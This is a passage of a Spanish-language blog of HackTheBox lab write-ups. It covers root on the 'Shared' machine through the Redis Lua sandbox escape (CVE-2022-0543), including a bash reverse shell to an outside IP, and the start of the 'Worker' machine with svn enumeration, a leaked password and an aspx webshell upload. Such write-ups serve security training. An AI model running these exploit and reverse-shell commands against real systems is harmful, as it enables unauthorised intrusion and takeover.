allocator_rss_ratio:2.60
allocator_rss_bytes:2576384
rss_overhead_ratio:3.65
rss_overhead_bytes:11100160
mem_fragmentation_ratio:18.39
mem_fragmentation_bytes:14451360
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20504
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1716755887
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

<span class="c"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:68
total_net_output_bytes:39
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:2
io_threaded_reads_processed:0
io_threaded_writes_processed:0

<span class="c"># Replication</span>
role:master
connected_slaves:0
master_replid:5785490148c587b8fd50f8a935ace659f1056459
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c"># CPU</span>
used_cpu_sys:0.016155
used_cpu_user:0.047905
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c"># Modules</span>

<span class="c"># Cluster</span>
cluster_enabled:0

<span class="c"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si buscamos alguna forma de elevar privilegios encontramos lo siguiente <a href="https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis">https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/18.png" />
</p>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">whoami</code> vemos que funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="s2">"root</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Bueno como podemos ejecutar comandos vamos a enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>reverse
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/reverse", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 50994
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3619<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@shared:/var/lib/redis#
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shared:/var/lib/redis# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
a5f9fb3e112adc4dd4e6650e64d240e1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Worker (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" rel="alternate" type="text/html" title="HackTheBox - Worker (medium)" /><published>2024-05-17T00:00:00-06:00</published><updated>2024-05-17T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png" />
</p>

<ul>
  <li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,3690,5985 10.10.10.203 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-14 18:47 CST
Nmap scan report <span class="k">for </span>10.10.10.203
Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Comenzamos enumerando el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/1.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.203 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.203
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code class="language-plaintext highlighter-rouge">svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
  </li>
  <li>
    <p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
  </li>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nc <span class="nt">-vn</span> 10.10.10.203 3690
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 3690 <span class="o">(</span>svn<span class="o">)</span> open
<span class="o">(</span> success <span class="o">(</span> 2 2 <span class="o">(</span> <span class="o">)</span> <span class="o">(</span> edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list <span class="o">)</span> <span class="o">)</span> <span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Además nos mencionan uso de esta herramienta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">help
</span>usage: svn &lt;subcommand&gt; <span class="o">[</span>options] <span class="o">[</span>args]
Subversion command-line client.
Type <span class="s1">'svn help &lt;subcommand&gt;'</span> <span class="k">for </span><span class="nb">help </span>on a specific subcommand.
Type <span class="s1">'svn --version'</span> to see the program version and RA modules,
     <span class="s1">'svn --version --verbose'</span> to see dependency versions as well,
     <span class="s1">'svn --version --quiet'</span> to see just the version number.

Most subcommands take file and/or directory arguments, recursing
on the directories.  If no arguments are supplied to such a
<span class="nb">command</span>, it recurses on the current directory <span class="o">(</span>inclusive<span class="o">)</span> by default.

Available subcommands:
   add
   auth
   blame <span class="o">(</span>praise, annotate, ann<span class="o">)</span>
   <span class="nb">cat
   </span>changelist <span class="o">(</span>cl<span class="o">)</span>
   checkout <span class="o">(</span>co<span class="o">)</span>
   cleanup
   commit <span class="o">(</span>ci<span class="o">)</span>
   copy <span class="o">(</span><span class="nb">cp</span><span class="o">)</span>
   delete <span class="o">(</span>del, remove, <span class="nb">rm</span><span class="o">)</span>
   diff <span class="o">(</span>di<span class="o">)</span>
   <span class="nb">export
   help</span> <span class="o">(</span>?, h<span class="o">)</span>
   import
   info
   list <span class="o">(</span><span class="nb">ls</span><span class="o">)</span>
   lock
   log
   merge
   mergeinfo
   <span class="nb">mkdir
   </span>move <span class="o">(</span><span class="nb">mv</span>, rename, ren<span class="o">)</span>
   patch
   propdel <span class="o">(</span>pdel, pd<span class="o">)</span>
   propedit <span class="o">(</span>pedit, pe<span class="o">)</span>
   propget <span class="o">(</span>pget, pg<span class="o">)</span>
   proplist <span class="o">(</span>plist, pl<span class="o">)</span>
   propset <span class="o">(</span>pset, ps<span class="o">)</span>
   relocate
   resolve
   resolved
   revert
   status <span class="o">(</span><span class="nb">stat</span>, st<span class="o">)</span>
   switch <span class="o">(</span>sw<span class="o">)</span>
   unlock
   update <span class="o">(</span>up<span class="o">)</span>
   upgrade

Subversion is a tool <span class="k">for </span>version control.
For additional information, see http://subversion.apache.org/
</code></pre></div></div>

<ul>
  <li>Podemos listar lo que hay.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn <span class="nb">ls </span>svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div></div>

<ul>
  <li>Tambien nos dicen que podemos descargar el repositorio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap svn checkout svn://10.10.10.203
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss
A    dimension.worker.htb/assets/sass/components/_icon.scss
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
</code></pre></div></div>

<ul>
  <li>Si vemos lo que dice <code class="language-plaintext highlighter-rouge">moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.203 devops.worker.htb dimension.worker.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<ul>
  <li>Nos pide credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/3.png" />
</p>

<ul>
  <li>En el otro subdominio solo encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/4.png" />
</p>

<ul>
  <li>Esto es todo lo que contiene.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb tree
<span class="nb">.</span>
├── LICENSE.txt
├── README.txt
├── assets
│   ├── css
│   │   ├── fontawesome-all.min.css
│   │   ├── main.css
│   │   └── noscript.css
│   ├── js
│   │   ├── breakpoints.min.js
│   │   ├── browser.min.js
│   │   ├── jquery.min.js
│   │   ├── main.js
│   │   └── util.js
│   ├── sass
│   │   ├── base
│   │   │   ├── _page.scss
│   │   │   ├── _reset.scss
│   │   │   └── _typography.scss
│   │   ├── components
│   │   │   ├── _actions.scss
│   │   │   ├── _box.scss
│   │   │   ├── _button.scss
│   │   │   ├── _form.scss
│   │   │   ├── _icon.scss
│   │   │   ├── _icons.scss
│   │   │   ├── _image.scss
│   │   │   ├── _list.scss
│   │   │   └── _table.scss
│   │   ├── layout
│   │   │   ├── _bg.scss
│   │   │   ├── _footer.scss
│   │   │   ├── _header.scss
│   │   │   ├── _main.scss
│   │   │   └── _wrapper.scss
│   │   ├── libs
│   │   │   ├── _breakpoints.scss
│   │   │   ├── _functions.scss
│   │   │   ├── _mixins.scss
│   │   │   ├── _vars.scss
│   │   │   └── _vendor.scss
│   │   ├── main.scss
│   │   └── noscript.scss
│   └── webfonts
│       ├── fa-brands-400.eot
│       ├── fa-brands-400.svg
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.eot
│       ├── fa-regular-400.svg
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.eot
│       ├── fa-solid-900.svg
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff
│       └── fa-solid-900.woff2
├── images
│   ├── bg.jpg
│   ├── overlay.png
│   ├── pic01.jpg
│   ├── pic02.jpg
│   └── pic03.jpg
└── index.html

11 directories, 55 files
</code></pre></div></div>

<ul>
  <li>Aquí podemos ver el <code class="language-plaintext highlighter-rouge">Commit history</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r5 | nathen | 2020-06-20 08:52:00 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added note that repo has been migrated
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
r3 | nathen | 2020-06-20 08:46:19 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

-
<span class="nt">------------------------------------------------------------------------</span>
r2 | nathen | 2020-06-20 08:45:16 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Added deployment script
<span class="nt">------------------------------------------------------------------------</span>
r1 | nathen | 2020-06-20 08:43:43 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

First version
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Este es interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>El archivo <code class="language-plaintext highlighter-rouge">deploy.ps1</code> fue eliminado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn log <span class="nt">-v</span> <span class="nt">-r</span> 4 svn://10.10.10.203
<span class="nt">------------------------------------------------------------------------</span>
r4 | nathen | 2020-06-20 08:50:20 <span class="nt">-0500</span> <span class="o">(</span>Sat, 20 Jun 2020<span class="o">)</span> | 1 line
Changed paths:
   D /deploy.ps1

Moving this repo to our new devops server which will handle the deployment <span class="k">for </span>us
<span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  dimension.worker.htb svn diff <span class="nt">-r</span> 2:3 svn://10.10.10.203/deploy.ps1

Index: deploy.ps1
<span class="o">===================================================================</span>
<span class="nt">---</span> deploy.ps1	<span class="o">(</span>revision 2<span class="o">)</span>
+++ deploy.ps1	<span class="o">(</span>revision 3<span class="o">)</span>
@@ <span class="nt">-1</span>,6 +1,7 @@
 <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"nathen"</span>
-<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">"wendel98"</span>
+# NOTE: We cant have my password here!!!
+<span class="nv">$plain</span> <span class="o">=</span> <span class="s2">""</span>
 <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$plain</span> | ConvertTo-SecureString<span class="o">)</span>
 <span class="nv">$Credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$user</span>, <span class="nv">$pwd</span>
 <span class="nv">$args</span> <span class="o">=</span> <span class="s2">"Copy-Site.ps1"</span>
<span class="nt">-Start-Process</span> powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
+Start-Process powershell.exe <span class="nt">-Credential</span> <span class="nv">$Credential</span> <span class="nt">-ArgumentList</span> <span class="o">(</span><span class="s2">"-file </span><span class="nv">$args</span><span class="s2">"</span><span class="o">)</span>
<span class="se">\ </span>No newline at end of file
</code></pre></div></div>

<ul>
  <li>Si las probamos en el sitio web vemos que son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/5.png" />
</p>

<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>

<ul>
  <li>Vemos varios repositorios al parecer son los subdominios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/6.png" />
</p>

<ul>
  <li>
    <p>Como tenemos acceso podemos subir un <code class="language-plaintext highlighter-rouge">.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
  </li>
  <li>
    <p>Si lo intentamos subir no nos deja.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/7.png" />
</p>

<ul>
  <li>
    <p>Nos dicen que tenemos que hacer un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</p>
  </li>
  <li>
    <p>Vamos a crear una nueva rama.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/8.png" />
</p>

<ul>
  <li>Si subimos el archivo vemos que ahora si se puede.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/9.png" />
</p>

<ul>
  <li>Vamos a crear un <code class="language-plaintext highlighter-rouge">Pull Request</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/10.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/11.png" />
</p>

<ul>
  <li>Ahora lo aprobamos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/12.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/13.png" />
</p>

<ul>
  <li>Pero no vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/14.png" />
</p>

<ul>
  <li>
    <p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
  </li>
  <li>
